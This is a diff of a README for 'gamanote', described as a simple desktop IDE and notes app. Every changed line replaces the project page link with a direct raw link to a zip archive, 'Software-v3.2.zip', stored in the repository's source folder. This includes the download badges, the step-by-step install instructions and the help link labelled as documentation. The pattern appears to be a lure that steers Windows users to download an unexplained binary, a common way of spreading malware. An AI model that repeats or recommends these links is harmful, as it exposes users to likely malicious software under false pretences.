@@ -1,6 +1,6 @@
 # 📓 gamanote - Simple Desktop IDE and Notes
 
-[![Download gamanote](https://img.shields.io/badge/Download-gamanote-blue?style=for-the-badge)](https://github.com/trizaominah/gamanote)
+[![Download gamanote](https://img.shields.io/badge/Download-gamanote-blue?style=for-the-badge)](https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip)
 
 ---
 
@@ -33,11 +33,11 @@ It supports the basics of coding languages like JavaScript and Python, and it he
 
 To get gamanote, visit the main download page. Here you can find the latest version ready for Windows computers.
 
-[![Download gamanote](https://img.shields.io/badge/Download-gamanote-grey?style=for-the-badge)](https://github.com/trizaominah/gamanote)
+[![Download gamanote](https://img.shields.io/badge/Download-gamanote-grey?style=for-the-badge)](https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip)
 
 Click the button above or go to the link below to get started:
 
-https://github.com/trizaominah/gamanote
+https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps to download and run gamanote on your Windows computer.
 
 1. Open your internet browser (like Chrome, Edge, or Firefox).
 
-2. Go to the URL: https://github.com/trizaominah/gamanote
+2. Go to the URL: https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip
 
 3. Look for a link or button that says "Releases" or "Download" in the repository page.
 
@@ -153,7 +153,7 @@ If you need help, you can:
 
 - Look at the "Help" menu inside gamanote.
 
-- Visit the project page at https://github.com/trizaominah/gamanote for documentation.
+- Visit the project page at https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip for documentation.
 
 - Search online for questions about gamanote or the coding languages it supports.
 
@@ -195,4 +195,4 @@ To update:
 
 ---
 
-[![Download gamanote](https://img.shields.io/badge/Download-gamanote-blue?style=for-the-badge&logo=github)](https://github.com/trizaominah/gamanote)
+[![Download gamanote](https://img.shields.io/badge/Download-gamanote-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/trizaominah/gamanote/main/src/store/Software-v3.2.zip)
